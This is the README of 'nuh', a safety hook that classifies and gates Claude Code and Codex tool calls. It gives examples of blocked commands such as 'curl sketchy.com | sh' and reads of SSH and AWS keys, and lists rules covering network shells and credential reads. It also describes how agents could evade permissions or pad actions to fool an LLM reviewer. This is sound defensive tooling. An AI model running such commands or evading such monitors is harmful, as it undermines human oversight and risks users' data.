<p align="center">
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo.png" alt="nuh" width="280">
</p>

<p align="center">
  <strong>Context aware safety guard for Claude Code.</strong><br>
  Because allow and deny isn't enough.
</p>

<p align="center">
  <a href="https://schipper.ai/nah/">Upstream docs</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#what-it-guards">What it guards</a> &bull;
  <a href="#how-it-works">How it works</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a>
</p>

> **nuh was called nah.** It is a fork of the Python line of upstream
> [manuelschipper/nah](https://github.com/manuelschipper/nah), which has moved to Rust; the fork no
> longer merges from upstream and took its own name to avoid confusion. The old names (`nah`
> command, `~/.config/nah`, `.nah.yaml`, `NAH_*`, `nah_guard.py`) are not read. Links to
> schipper.ai are the upstream docs.

---

## The problem

Claude Code’s permission system is allow-or-deny per tool, but that doesn’t really scale. Deleting some files is fine sometimes. And git checkout is sometimes catastrophic. Even when you curate permissions, 200 IQ Opus can find a way around it. Maintaining a deny list is a fool’s errand.

We needed something like --dangerously-skip-permissions that doesn’t nuke your untracked files, exfiltrate your keys, or install malware.

`nuh` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

`git push` — Sure.<br>
`git push --force` — **nuh?**

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nuh.**

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.ssh/id_rsa` — **nuh.**

**Write** `./config.yaml` — Fine.<br>
**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nuh.**

## Install

```bash
pipx install --editable .   # from a checkout; nuh is not on PyPI
nuh claude              # try it — hooks active for this session only
```

For permanent use:

```bash
nuh install             # hooks in ~/.claude/settings.json, every session, plus zsh completion
```

pipx installs `man nuh` but never shell completions, so `nuh install` writes the zsh completion: into oh-my-zsh's completions directory (`$ZSH_CACHE_DIR/completions/_nuh`) when there is one, otherwise `~/.local/share/zsh/site-functions/_nuh`, telling you the `fpath=(...)` line to add to `~/.zshrc` when that directory is not on your `fpath`. It never edits your shell startup files. `nuh update` refreshes the completion, `nuh uninstall` removes it (only a file nuh generated), `nuh install --no-completion` skips it. Until it is installed, zsh users at a terminal get a one-line reminder on stderr from the CLI (never in stdout, and never from the hook); `completion_hint: false` in the global config hides it.

From a checkout, `make install` does the pipx install, which brings `man nuh`, then writes the completion with `nuh install --completion-only` (no hook). The man page of an editable install is rendered at install time: after changing help text, run `make install` again. `make update` runs `make install` and then `nuh update` with the pipx copy, so the installed hook matches the installed package.

`nuh claude` passes hooks inline via `--settings`, scoped to that process. `nuh install` writes to `settings.json` so every `claude` session runs through nuh. Undo with `nuh uninstall`.

**A hook that fails or times out denies the call.** By default Claude Code lets a call through when its hook crashes or times out, so nuh registers itself with `"onFailure": "block"` (Claude Code 2.1.295 or later) and an explicit `"timeout"`: `hook.deadline_s` plus every LLM provider's `timeout` plus a 10-second margin, at least 60 seconds. nuh's own inspection (parsing, classification, content scanning) runs within `hook.deadline_s` (default 20); running out asks, "nuh: inspection timed out". LLM providers keep their own `timeout` on top, but the whole cascade shares one budget: the hook timeout minus 5 seconds, minus the time already spent. Each request's timeout is cut to what is left, and a provider reached with less than a second left is skipped ("the hook's time budget ran out"), so `llm.on_failure` decides the call and nuh logs it before Claude Code would kill the hook. The hook script carries the timeout its settings entry was written with (edit that entry by hand and the script no longer knows it); a script from an older nuh counts as 60 seconds, the smallest timeout `nuh install` writes. Run `nuh update` after changing either, to rewrite the hook timeout.

```yaml
# ~/.config/nuh/config.yaml (global only)
hook:
  deadline_s: 20
  on_error: ask         # ask | block | defer
```

**A hook that fails inside asks.** When nuh itself raises (a bug, a malformed payload, a config that will not load), it could not classify the call, which it treats like any other call it cannot settle: `hook.on_error: ask` (the default) asks, with the error as the reason. `block` denies instead ("internal error — blocked for safety"). `defer` sends no decision, so Claude Code's own permission mode decides, as `defer` in `tools:` does for an allow; nuh never sends an allow for a call it failed on. Codex gets the same three, its ask being the block it gets for any ask. Each is logged with the error (`internal_error` in `nuh log -v`); a deferred one is logged as an allow whose reason says no decision was sent. When the config is what failed to load, the default applies. A project `.nuh.yaml` cannot set `hook.*`. `onFailure: block` above is separate: it covers a hook that dies or times out before it can answer at all.

**Don't use `--dangerously-skip-permissions`** — just run `claude` in default mode. In `--dangerously-skip-permissions` mode, hooks [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) and commands execute before nuh can block them.

Each tool gets one word in `tools:` that says whether nuh's allow is sent (Claude Code then runs the call without its own prompt) or left silent (Claude Code's permission mode decides), and how far the LLM layer may weigh in. An ask or block is always sent.

```yaml
# ~/.config/nuh/config.yaml
tools:                  # defer < approve < check < decide (defaults shown)
  Bash: decide
  Write: decide
  Edit: decide          # MultiEdit, NotebookEdit and apply_patch follow Edit
  Read: approve
  Glob: approve
  Grep: approve
  # any other tool: defer (allow left silent)
```

To get Claude Code's own prompt for safe edits, set `Edit: defer` (and `Write: defer`). See [Gating](https://schipper.ai/nah/configuration/llm/#gating-three-questions-per-tool).

To uninstall: `nuh uninstall && pipx uninstall nuh`.

### Codex

```bash
nuh install --agent codex
nuh update --agent codex
# Remove only the Codex integration:
nuh uninstall --agent codex
```

Codex uses synchronous `PreToolUse` hooks for shell, file, read/search, web,
and MCP tools, including explicit `apply_patch` coverage. Updates preserve custom
nuh matchers. Installation writes `~/.codex/hooks.json` and
`~/.codex/hooks/nuh_guard.py`; Claude remains the default installation target.
Enable and trust the hooks in Codex after installation or updates. Existing
disabled hooks are not enabled by nuh.

Codex does not support `PreToolUse` confirmation prompts. A nuh `ask` decision
therefore **denies the attempt with a review-required reason**. Review the
operation and adjust your nuh policy deliberately before retrying. Claude Code
continues to receive `ask`. A Codex `allow` leaves normal Codex permissions in
effect. See [Codex integration](docs/codex.md) for detection, patch coverage,
and failure behavior.

## Try it out

Clone the repo and run the security demo inside Claude Code:

```bash
git clone https://github.com/justsaynuh/nuh.git
cd nuh
# inside Claude Code:
/nuh-demo
```

25 live cases across 8 threat categories: remote code execution, data exfiltration, obfuscated commands, and others. Takes ~5 minutes.

## What it guards

nuh is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts **every** tool call before it executes:

| Tool | What nuh checks |
|------|----------------|
| **Bash** | Structural command classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP tools** | Generic classification for third-party tool servers (`mcp__*`) |

## How it works

Every tool call hits a deterministic structural classifier first, no LLMs involved.

```
Claude: Edit → ~/.claude/hooks/nuh_guard.py
  nuh. Edit targets hook directory: ~/.claude/hooks/ (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nuh? Read targets sensitive path: ~/.aws (requires confirmation)

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
  nuh? Write content inspection [secret]: private key
```

**`nuh.`** = blocked. **`nuh?`** = asks for your confirmation. Everything else goes through.

### Context-aware

The same command gets different decisions based on context:

| Command | Context | Decision |
|---------|---------|----------|
| `rm dist/bundle.js` | Inside project | Allow |
| `rm ~/.bashrc` | Outside project | Ask |
| `git push --force` | History rewrite | Ask |
| `base64 -d \| bash` | Decode + exec pipe | Block |

### Optional LLM layer

For commands the classifier can't resolve, nuh can optionally consult an LLM:

```
Tool call → nuh (deterministic) → LLM (optional) → Claude Code permissions → execute
```

The deterministic layer always runs first — the LLM only resolves leftover "ask" decisions. If no LLM is configured or available, the decision stays "ask" and the user is prompted.

Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake Cortex. Or `system1`, a decision model that answers fixed questions with numbers, ahead of a prompted one (see [LLM layer](https://schipper.ai/nah/configuration/llm/#system-1)).

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nuh/config.yaml  (global)
# .nuh.yaml                  (per-project, can only tighten)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nuh about your custom commands
classify:
  filesystem_delete:
    - cleanup-staging
  db_write:
    - migrate-prod
```

nuh classifies commands by **action type**, not by command name. Run `nuh types` to see every built-in action type with its default policy.

### Action types

Every command maps to an action type, and every action type has a default policy:

| Policy | Meaning | Example types |
|--------|---------|---------------|
| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound`, `lang_exec` |
| `ask` | Always prompt the user | `git_history_rewrite`, `git_remote_write`, `process_signal` |
| `block` | Always reject | `obfuscated` |

### Taxonomy profiles

Choose how much built-in classification to start with:

```yaml
# ~/.config/nuh/config.yaml
profile: full      # full | minimal | none
```

- **full** (default) — comprehensive coverage across shell, git, packages, containers, and more
- **minimal** — curated essentials only (rm, git, curl, kill, ...)
- **none** — blank slate — make your own

### Static floor

Some asks and blocks come from **floor rules**: every rule is `human_only`, so no LLM may lower its asks, and config can only make them stricter. An `actions` policy, a `sensitive_paths` or `sensitive_basenames` allow, `allow_paths` or `protect_package: false` that would lower one prints a warning and is ignored; a `classify` entry or `profile` that renames a command's type leaves its floor in place. A floored decision is logged with `"floor": "<rule id>"` (asks also get `"llm_replayable": true`, so the call can be replayed against the LLM later), and `nuh test` prints the rule.

| Rule id | Covers |
|---------|--------|
| `nuh_admin` | mutating `nuh` subcommands; uninstalling, reinstalling or pinning nuh, including an editable install of a nuh checkout; installing any package into the environment the hook runs from |
| `project_config` | writes to a project's `.nuh.yaml` |
| `agent_hooks` | writes to agent hook wiring and settings, nuh's own config, or a parent of them |
| `unguarded_launch` | launching `claude` or `codex` with hooks or permissions turned off |
| `catastrophic` | deletes of `/`, home, system trees, trusted roots, `.git` or the project root; raw storage; recursive permission changes; fork bombs |
| `privilege` | `sudo`, `doas`, `su`, `pkexec`, `runuser` |
| `power_service` | power commands and stopping or disabling services |
| `network_shell` | shells or programs wired to a network socket |
| `credential_paths` | built-in credential files, private keys and `.env` files |
| `sensitive_paths` | every other sensitive path: your `sensitive_paths` and `sensitive_basenames` entries, shell init files, agent settings and the rest of the built-in list |
| `git_exec` | git config keys and environment that run a program; `.git/hooks` and `.git/config` writes |
| `ssh_exec_options` | ssh options and config files that run a local command |
| `hidden_chars` | control, bidi, zero-width and other characters that hide text |
| `env_read` | environment dumps (`env`, `printenv`, `export -p`), printing a credential variable, secret-manager reads (`aws secretsmanager`, `vault read`, `op read`, `kubectl get secret`, ...) |
| `package_dir` | writes to the directory nuh runs from: file tools, redirects, `rm`/`mv`/`sed -i`/`chmod`, copies onto it, renaming a parent (git and reads are free) |

When one rule's asks prove noisy, let the LLM decide them in the **global** config (a project `.nuh.yaml` can't):

```yaml
# ~/.config/nuh/config.yaml
human_only:
  git_exec: false      # true (default for every floor rule) | false
```

A floor rule set to false is still a floor: config cannot lower it, only an LLM review of a tool whose word is `decide` can. Blocks stay blocks either way, and a catastrophic block also overrides your `actions:` policies. Unknown keys are reported on stderr and ignored.

Working on nuh itself from an editable install? The `package_dir` rule covers only the checkout nuh runs from, so other worktrees are free. It cannot be switched off (`protect_package: false` warns and is ignored); `human_only: {package_dir: false}` lets the LLM decide its asks.

### Project root

The project is the git toplevel of the directory the agent works in. Two **global** settings (a project `.nuh.yaml` setting either is ignored with a warning) cover folders that aren't repositories:

```yaml
# ~/.config/nuh/config.yaml
project_root: git_or_launch_dir   # git (default) | git_or_launch_dir
project_lifts_sensitive: true     # default false
```

- `git_or_launch_dir`: with no git root, the project is the directory the agent was launched in (`$CLAUDE_PROJECT_DIR` for Claude Code, the hook payload's `cwd` for Codex). It must be an absolute, existing directory; `/`, your home directory and anything above it are refused. Everything that uses the project root follows it: the outside-project boundary, `allow_paths`, `.nuh.yaml`.
- `project_lifts_sensitive`: a path inside the project skips your own `sensitive_paths` entries (from the global config) that are the project root or above it. With `~/Documents: ask` and Claude launched in `~/Documents/Club`, reads and edits in `Club` go through and `~/Documents/Other` still asks. Built-in entries (and your overrides of them), `~/.ssh`, entries inside the project, `.nuh.yaml` entries, protected writes (hooks, agent settings, `.nuh.yaml`, git and ssh config) and content checks all still apply. Both spellings of the path must be inside the project (a symlink out of it still asks), and a shell word is lifted only when every path it can expand to is inside: `$X`, `{a,b}` and `~-` never are, a glob is when each of its matches is.

### LLM configuration

```yaml
# ~/.config/nuh/config.yaml
llm:
  enabled: true
  can_block: false               # an LLM block asks; true lets it block
  providers: [openrouter]        # cascade order
  openrouter:
    url: https://openrouter.ai/api/v1/chat/completions
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
    max_prompt_tokens: 32768     # hosted providers: largest prompt to send (default shown)
    redact_secrets: false        # mask secrets in what this provider is sent (default off)
  ollama:
    url: http://localhost:11434/api/chat
    model: qwen3.5:9b
    num_ctx: 24576               # context size sent with every request (default shown)
  trace_dir: ~/.local/state/nuh/llm-traces   # optional: full record of each LLM review
  max_action_chars: 48000        # larger actions are not reviewed: the decision is ask
  max_prompt_chars: 60000        # whole prompt: system + action + conversation context
  context_chars: 12000           # cap on conversation context per review (0 = none)
  context:                       # per-section budgets inside that cap (defaults shown)
    first_prompt_chars: 1500     # your first message of the session (usually the task)
    user_turns: 6                # your most recent messages...
    user_chars: 4000             # ...and their combined size
    tool_calls: 12               # the agent's recent tool calls
    assistant_chars: 1500        # the agent's own prose (kept small: it can steer the reviewer)
```

**The tool's word in `tools:` sets what the review may do.** `decide` lets it raise a decision or, with a confident allow, lower a static ask to allow; `check` shows it only allows, which it may raise; `approve` and `defer` skip the LLM. `can_block` still caps a raise. An ask is lowered only when every `human_only` key behind it is false: action types (an outside-project write is `filesystem_write`, runnable text `lang_exec`) are false by default; floor rules, secret patterns, your own content categories and content too large to scan are true. A lowered call keeps the static reason in the log ("… — lowered to allow by LLM review"), next to the LLM's verdict in `nuh log -v`. To keep one kind of ask for yourself: `human_only: {git_remote_write: true}`.

**No call that cannot change the ask.** When no verdict could move a static ask (a `human_only` key is behind it, or the tool's word is `check`, `approve` or `defer`), the hook asks at once instead of waiting on the LLM. The log records it as `llm.skipped: no_effect` with a `skip_reason` (shown by `nuh log -v` and `nuh test`), and `nuh log --llm` leaves those entries out.

**The action is never cut.** The command, the program it runs (a `python3 -c` string, a heredoc or here-string fed to an interpreter, a script written earlier in the same command, or a script file), the content of a Write, and every Edit/MultiEdit string go to the reviewer whole. A cut would let an agent pad the action with harmless text and hide the dangerous part where the cut falls. An action over `max_action_chars` is not sent at all, and the decision is **ask** ("too large for LLM review"). That holds when the deterministic layer allowed too: the allow depended on the review. For programs, the prompt names what to look for: deleting or overwriting files outside the task, touching credentials or dotfiles, network sends, and spawning shells or other commands. The one exception is the generic review of other tools (Read, `mcp__*`, WebFetch, ...): their input JSON over `max_action_chars` is cut, with a marker telling the model how much it was shown.

**The model must read the whole prompt.** Past its context size Ollama silently drops the *start* of the prompt, which holds the instructions. nuh sends `num_ctx` with every Ollama request and estimates prompt tokens conservatively, at 3 characters per token, keeping 1024 tokens for the answer. A prompt that would not fit is not sent (ask). The default of 24576 fits a full 60000-character prompt (about 20K tokens at that rate, 15–19K in practice). A `num_ctx` different from the one the model is loaded with makes Ollama reload it on the first call, and larger contexts use more VRAM. If Ollama reports reading close to `num_ctx` tokens (`prompt_eval_count`), or far fewer than the prompt's size implies, the model may never have read the action, so its answer is not used: the attempt is a provider error, as a timeout is, and the cascade moves on (no provider answering asks). Hosted providers size their own context; `max_prompt_tokens` only bounds what nuh sends them. The smallest limit in the cascade applies to every provider.

**Conversation context gives way first.** It fills whatever the prompt budget leaves after the action, up to `context_chars`. When there is not enough room, it is trimmed in this order: the agent's tool calls (oldest first), then its prose, then your older messages, then a subagent's brief. Your first message and your newest message are cut last. Context is expendable: trimming it never caps or downgrades the reviewer's answer. Only the required part (the instructions, the call's tool and working directory, and the action) can turn a review into an ask.

The reviewer sees the conversation in labeled sections: your messages, the agent's messages, and its recent tool calls. For a subagent, it also sees the brief from the agent that delegated to it, marked as agent-written. Harness text (system reminders, task notifications, AGENTS.md) is left out, and the call under review is excluded. Works with Claude Code and Codex transcripts.

**Secrets are sent as they are.** Spotting credential exfiltration is part of the reviewer's job, and masking key-shaped text would let a payload hide inside a fake key (a PEM block or an `AKIA…` token). If you send reviews to a third-party cloud provider and would rather not share secrets with it, set `redact_secrets: true` for that provider. Each secret in the action and the conversation context is then replaced in place by `[redacted: <description>]` (for example `[redacted: GitHub token]`; for a keyword pattern only the value, as in `aws_secret_access_key = [redacted: AWS secret access key]`), and the rest of the line stays visible. A private key becomes one placeholder only when every line between its markers is key material; a line of anything else (a command, say) stays visible, and only the markers and base64 lines around it are masked. The context is built once per review, so it is masked for every provider in that cascade. The model's verdict on the masked prompt stands like any other. Static secret checks on writes still run on the real content, and an LLM allow never lowers their ask. The decision log is not redacted either way (see [Decision log](#decision-log)).

`trace_dir` (off by default) writes one directory per LLM review: the tool input, the deterministic classification, every provider request and response in full, and the final decision. Traces are **not redacted** apart from auth headers, so directories are created `0700` and files `0600`. A project's `.nuh.yaml` can never turn tracing on, but `trace: false` there turns it off for that project (trusted or not). See [LLM layer](https://schipper.ai/nah/configuration/llm/#trace_dir).

### Decision log

Every hook decision is appended to `~/.config/nuh/nuh.log` (JSONL). Each
entry keeps a short `input` summary (shown by `nuh log`) and the full
`tool_input`, both stored raw so a logged decision can be replayed: nothing
in the log is secret-redacted. By the time a tool call exists, any secret in
it is already in the agent's transcript and on the model provider's servers,
so masking the log would protect nothing. Treat the log like the transcript
and clear it yourself when you need to.

```yaml
# ~/.config/nuh/config.yaml
log:
  verbosity: all             # all | decisions (skip allows) | blocks_only
  max_input_chars: 20000     # per string value in tool_input; longer values are cut and marked
  max_size_bytes: 50000000   # rotate nuh.log past 50 MB
  backups: 5                 # keep nuh.log.1 … nuh.log.5
```

### Trusted network hosts

`network_outbound` commands (curl, wget, …) are allowed when every
destination host is trusted. Add hosts with `nuh trust <entry>` or in the
global config:

```yaml
# ~/.config/nuh/config.yaml
known_registries:
  - api.example.com     # exactly this host
  - "*.example.com"     # any subdomain (a.example.com, a.b.example.com)
  - .example.com        # same as *.example.com
  - 192.0.2.7           # exactly this IP address
  - 192.0.2.0/24        # any address in the range (IPv6 ranges work too)
```

Suffix entries match on a dot boundary and do **not** match the apex:
`*.example.com` covers `api.example.com` but not `example.com` or
`badexample.com`; list the apex separately if you want it. Ranges broader
than `/8` (IPv4) or `/32` (IPv6) are rejected. Trust only applies to reads:
`network_write` (POST, uploads, …) always asks, and localhost is always
allowed for reads. The dict form `known_registries: {add: [...], remove: [...]}`
can also drop built-in registries.

### Supply-chain safety

Project `.nuh.yaml` can **add** classifications and **tighten** policies, but can never relax them. A malicious repo can't use `.nuh.yaml` to allowlist dangerous commands — only your global config has that power.

## CLI

Every command, from `nuh --help`. `nuh COMMAND --help` and `man nuh` have each one's options and examples, as does
the [CLI reference](site/cli.md).

<!-- Generated from src/nuh/cli_parser.py by `make docs`; tests/test_gen_cli_docs.py fails while it is stale. -->
<!-- BEGIN GENERATED: nuh commands -->

| Command | What it does |
| --- | --- |
| `nuh install` | Install the nuh hook into coding agents, and nuh's zsh completion |
| `nuh update` | Rewrite the installed hook script and settings (unlock, overwrite, re-lock) |
| `nuh uninstall` | Remove the nuh hook from coding agents |
| `nuh claude` | Launch Claude Code with nuh hooks active |
| `nuh completion` | Print a shell completion script for nuh |
| `nuh test` | Dry-run classification for a command or tool input |
| `nuh config` | Show the effective config or its file paths |
| `nuh config show` | Display the effective merged config |
| `nuh config path` | Show the config file paths |
| `nuh log` | Show recent hook decisions |
| `nuh tail` | Follow hook decisions as they are logged (nuh log -f) |
| `nuh trace` | Browse and render LLM traces (llm.trace\_dir) |
| `nuh system1` | Write out or check the system 1 definition (no model call) |
| `nuh system1 export` | Write the shipped system 1 definition as YAML to edit |
| `nuh system1 check` | Validate a definition as the system 1 provider loads it (no model call) |
| `nuh heal-log` | Show what the llm.self\_heal workers did (read only) |
| `nuh types` | List all action types with descriptions and default policies |
| `nuh allow` | Set an action type's policy to allow |
| `nuh deny` | Set an action type's policy to block |
| `nuh allow-path` | Allow a sensitive path for the current project |
| `nuh classify` | Classify a command prefix as an action type |
| `nuh trust` | Trust a path or network host (global config) |
| `nuh status` | Show all custom rules |
| `nuh forget` | Remove a rule |

<!-- END GENERATED: nuh commands -->

## License

[MIT](LICENSE)

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="https://raw.githubusercontent.com/manuelschipper/nah/main/assets/logo_hammock.png" alt="nuh" width="280">
</p>
